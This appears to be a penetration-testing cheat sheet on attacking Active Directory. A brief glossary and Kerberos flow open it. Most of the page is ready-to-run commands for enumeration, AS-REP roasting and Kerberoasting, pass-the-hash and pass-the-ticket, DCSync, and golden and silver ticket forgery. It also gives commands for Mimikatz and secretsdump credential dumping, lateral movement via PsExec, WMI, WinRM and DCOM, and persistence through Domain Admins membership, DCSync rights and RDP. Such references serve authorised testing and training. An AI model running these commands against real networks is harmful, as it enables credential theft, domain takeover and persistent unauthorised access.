---
icon: window-frame-open
---

# Active Directory (AD)

### For more : [ad-exploitation](../../ad-exploitation/ "mention")

### AD Concepts

#### Terminology

| Term                              | Definition                                        |
| --------------------------------- | ------------------------------------------------- |
| **Domain Controller (DC)**        | Server that manages AD authentication and policy  |
| **Forest**                        | Top-level collection of one or more domains       |
| **Domain**                        | Logical grouping of AD objects                    |
| **OU (Organizational Unit)**      | Container for organizing AD objects               |
| **SPN (Service Principal Name)**  | Unique identifier for a service instance          |
| **TGT (Ticket Granting Ticket)**  | Kerberos ticket for getting other tickets         |
| **TGS (Ticket Granting Service)** | Service ticket for specific service access        |
| **KDC (Key Distribution Center)** | Kerberos authentication server on DC              |
| **KRBTGT**                        | Special account used to sign all Kerberos tickets |
| **ACL/ACE**                       | Access Control List / Entry (defines permissions) |

#### Kerberos Authentication Flow

```
1. Client → KDC: AS_REQ (pre-auth with password hash)
2. KDC → Client: AS_REP (TGT, encrypted with KRBTGT hash)
3. Client → KDC: TGS_REQ (TGT + requested SPN)
4. KDC → Client: TGS_REP (Service Ticket, encrypted with service account hash)
5. Client → Service: AP_REQ (Service Ticket)
6. Service → Client: AP_REP (confirmation)
```

***

### AD Enumeration

#### BloodHound / SharpHound

```bash
# Install BloodHound
apt install bloodhound

# Install Neo4j (BloodHound database)
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install neo4j
sudo neo4j start

# Start BloodHound
bloodhound &

# Run SharpHound on target (Windows)
# PowerShell collector
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp\

# Or SharpHound.exe
.\SharpHound.exe -c All --OutputDirectory C:\Temp\

# Remote collection (from Linux)
bloodhound-python -d domain.local -u username -p password -c All -ns DC_IP

# Import to BloodHound
# Drag and drop the ZIP file into the BloodHound GUI
```

**Key BloodHound Queries:**

* `Find all Domain Admins`
* `Find Shortest Paths to Domain Admins`
* `Find Principals with DCSync Rights`
* `Users with most local admin rights`
* `Find AS-REP Roastable Users`
* `Find Kerberoastable Users with High Value Targets`

***

#### PowerView

```powershell
# Import
Import-Module .\PowerView.ps1
# or
. .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController
Get-DomainPolicy
(Get-DomainPolicy)."system access"

# Users
Get-DomainUser
Get-DomainUser -Identity username
Get-DomainUser | select samaccountname, description  # find users with description (passwords!)
Get-DomainUser -SPN  # Kerberoastable users
Get-DomainUser -PreauthNotRequired  # ASREP Roastable users

# Groups
Get-DomainGroup
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse

# Computers
Get-DomainComputer
Get-DomainComputer | select name, operatingsystem

# GPOs
Get-DomainGPO
Get-DomainGPO -ComputerIdentity hostname

# ACLs
Get-DomainObjectAcl -Identity username -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs

# Shares
Find-DomainShare
Find-DomainShare -CheckShareAccess

# File hunting
Find-InterestingDomainShareFile -Include "*.txt","*.pdf","*.doc*"

# Trust relationships
Get-DomainTrust
Get-ForestTrust
Get-ForestDomain

# Local admin access
Find-LocalAdminAccess
```

***

#### LDAP Enumeration

```bash
# Enumerate with ldapsearch (anonymous)
ldapsearch -H ldap://$ip -x -b "DC=domain,DC=local"

# Enumerate users
ldapsearch -H ldap://$ip -x -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# With credentials
ldapsearch -H ldap://$ip -x -D "CN=user,DC=domain,DC=local" -w password \
  -b "DC=domain,DC=local" "(objectClass=user)"

# With ldapdomaindump
ldapdomaindump -u 'domain\username' -p 'password' DC_IP

# With enum4linux-ng
enum4linux-ng -A $ip -u username -p password
```

***

### AD Attacks

#### ASREP Roasting

> **ASREP Roasting** targets users with **Kerberos pre-authentication disabled**. The KDC returns an AS-REP encrypted with the user's password hash — crackable offline.

```bash
# Find ASREP Roastable users (no pre-auth required)
# With impacket
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP

# If you have domain credentials
GetNPUsers.py domain.local/username:password -dc-ip DC_IP -request

# With PowerView (enumerate)
Get-DomainUser -PreauthNotRequired | select samaccountname

# With Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Crack the hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

***

#### Kerberoasting

> **Kerberoasting** targets **service accounts with SPNs**. Service tickets (TGS) are encrypted with the service account's password — crackable offline.

```bash
# Enumerate SPNs
GetUserSPNs.py domain.local/username:password -dc-ip DC_IP

# Request and dump TGS hashes
GetUserSPNs.py domain.local/username:password -dc-ip DC_IP -request

# Save to file
GetUserSPNs.py domain.local/username:password -dc-ip DC_IP -request -outputfile tgs_hashes.txt

# With Rubeus (Windows)
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt

# With PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash

# Crack
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```

***

#### Pass-the-Hash

> Using NTLM hash **instead of plaintext password** for authentication.

```bash
# With impacket psexec
psexec.py domain/username@$ip -hashes :NTLM_HASH

# With impacket smbclient
smbclient.py domain/username@$ip -hashes :NTLM_HASH

# With wmiexec
wmiexec.py domain/username@$ip -hashes :NTLM_HASH

# With CrackMapExec
crackmapexec smb $ip -u username -H NTLM_HASH

# With pth-winexe
pth-winexe -U domain/username%NTLM_HASH //TARGET_IP cmd.exe

# With Mimikatz (Windows)
sekurlsa::pth /user:username /domain:domain.local /ntlm:NTLM_HASH /run:cmd.exe
```

***

#### Pass-the-Ticket

> Using a stolen Kerberos **TGT or TGS** for authentication.

```bash
# Steal TGT with Mimikatz
sekurlsa::tickets /export

# Load a ticket
kerberos::ptt ticket.kirbi

# Or with Rubeus
.\Rubeus.exe dump /service:krbtgt /nowrap      # dump all TGTs
.\Rubeus.exe ptt /ticket:BASE64_TICKET          # inject ticket

# From Linux with impacket
ticketConverter.py ticket.ccache ticket.kirbi   # convert formats
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/username@target
```

***

#### Overpass-the-Hash

> Convert NTLM hash to Kerberos TGT (useful where PtH is blocked).

```powershell
# With Mimikatz
sekurlsa::pth /user:username /domain:domain.local /ntlm:NTLM_HASH /run:powershell.exe
# Inside new PS window:
klist                                    # verify tickets
net use \\DC\IPC$                         # trigger Kerberos auth
# Now have TGT, can use Kerberos-based services

# With Rubeus
.\Rubeus.exe asktgt /domain:domain.local /user:username /rc4:NTLM_HASH /ptt
```

***

#### DCSync

> Mimics Domain Controller replication to **pull all user hashes** from AD. Requires `DS-Replication-Get-Changes` permissions (Domain Admins, Enterprise Admins, or explicitly granted).

```bash
# With Mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv

# With impacket secretsdump
secretsdump.py domain.local/username:password@DC_IP
secretsdump.py domain.local/username@DC_IP -hashes :NTLM_HASH

# Target specific user
secretsdump.py domain.local/username:password@DC_IP -just-dc-user Administrator
```

***

#### Golden Ticket

> Using the **KRBTGT hash** to forge unlimited Kerberos TGTs as **any user**.

```bash
# Prerequisites: KRBTGT hash, Domain SID

# Get KRBTGT hash (requires DCSync or DC access)
secretsdump.py domain.local/administrator:password@DC_IP -just-dc-user krbtgt

# Get Domain SID
lookupsid.py domain.local/username:password@DC_IP | grep "Domain SID"

# Forge Golden Ticket with Mimikatz
kerberos::purge
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:KRBTGT_HASH /ptt

# Open shell with golden ticket
misc::cmd

# With impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXX -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@DC_IP
```

***

#### Silver Ticket

> Using a **service account hash** to forge TGS tickets for that specific service.

```bash
# Requires: service account NTLM hash, Domain SID, target SPN

# Forge Silver Ticket with Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX \
  /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt

# Common services: cifs, http, ldap, mssql, wsman
```

***

### Credential Dumping

#### Mimikatz

```powershell
# Run as administrator/SYSTEM
privilege::debug

# Dump all credentials from memory
sekurlsa::logonpasswords

# Dump NTLM hashes
sekurlsa::msv

# Dump Kerberos tickets
sekurlsa::tickets
sekurlsa::tickets /export

# Dump SAM database
token::elevate
lsadump::sam

# Dump LSA secrets
lsadump::secrets

# DCSync (pull from DC)
lsadump::dcsync /domain:domain.local /user:Administrator
lsadump::dcsync /domain:domain.local /all

# Pass-the-Hash
sekurlsa::pth /user:username /domain:domain.local /ntlm:HASH /run:cmd.exe
```

#### CrackMapExec

```bash
# SMB enumeration
crackmapexec smb $ip -u username -p password

# Enumerate shares
crackmapexec smb $ip -u username -p password --shares

# Enumerate users
crackmapexec smb $ip -u username -p password --users

# Enumerate groups
crackmapexec smb $ip -u username -p password --groups

# Spray password
crackmapexec smb $ip/24 -u username -p password

# Pass-the-Hash
crackmapexec smb $ip -u username -H NTLM_HASH

# Execute command
crackmapexec smb $ip -u username -p password -x "whoami"

# Dump SAM
crackmapexec smb $ip -u username -p password --sam

# Dump NTDS.dit
crackmapexec smb $ip -u username -p password --ntds

# Run Mimikatz (dump creds from memory)
crackmapexec smb $ip -u Administrator -H HASH -M mimikatz --server=http --server-port=80
```

#### Secretsdump

```bash
# From Linux, dump all hashes
secretsdump.py domain.local/username:password@DC_IP

# With NTLM hash
secretsdump.py domain.local/username@DC_IP -hashes :NTLM_HASH

# Just dump the NTDS.dit remotely
secretsdump.py domain.local/username:password@DC_IP -just-dc-ntlm

# From SAM/SYSTEM hives (offline)
secretsdump.py -sam sam.hive -system system.hive LOCAL

# Target specific DC
secretsdump.py domain.local/administrator:password@DC_IP -dc-ip DC_IP
```

***

### Lateral Movement

#### PsExec

```bash
# Linux (impacket)
psexec.py domain/username:password@TARGET_IP

# With hash
psexec.py domain/username@TARGET_IP -hashes :NTLM_HASH

# Windows — PsExec.exe
PsExec.exe \\TARGET_IP -u Administrator -p password cmd.exe

# Via SMB share
PsExec.exe \\TARGET_IP cmd.exe
```

#### WMI

```bash
# Linux (impacket)
wmiexec.py domain/username:password@TARGET_IP

# Run command
wmiexec.py domain/username:password@TARGET_IP "whoami"

# Windows
wmic /node:TARGET_IP /user:domain\username /password:password process call create "cmd.exe /c whoami > C:\temp\output.txt"
```

#### WinRM

```bash
# Linux
evil-winrm -i TARGET_IP -u username -p password

# With hash
evil-winrm -i TARGET_IP -u username -H NTLM_HASH

# Windows (PowerShell)
Enter-PSSession -ComputerName TARGET_IP -Credential domain\username

# Mount share for file transfer
net use \\DC\netlogon /user:domain\username password
```

#### DCOM (Distributed COM)

```powershell
# MMC20.Application DCOM execution
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("MMC20.Application", "TARGET_IP"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc.exe","7")

# Excel.Application DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "TARGET_IP"))

# ShellBrowserWindow DCOM (Windows 10)
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "TARGET_IP"))
$com.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
```

***

### Domain Persistence

#### Persistence via AD ACL Abuse

```powershell
# Add user to Domain Admins
Add-DomainGroupMember -Identity "Domain Admins" -Members username

# Grant DCSync rights to a user
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity username \
  -Rights DCSync

# Add password to a user account
Set-DomainUserPassword -Identity username -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

# Disable password expiry
Set-DomainUser username -PasswordNeverExpires $true
```

#### Remote Desktop Persistence

```cmd
# Add user to RDP group
net localgroup "Remote Desktop Users" username /add

# Enable RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

#### Domain Enumeration via RPC

```powershell
# Using rpcclient
rpcclient -U "domain\username%password" DC_IP
rpcclient $> enumdomusers     # list all domain users
rpcclient $> enumdomgroups    # list all domain groups
rpcclient $> queryuser 0x1F4  # get user info by RID
rpcclient $> enumprivs        # list privileges
rpcclient $> querydispinfo    # display user info

# Enumerate inactive users
rpcclient -U "domain\username%password" DC_IP -c "enumdomusers" | grep "inactive"
```
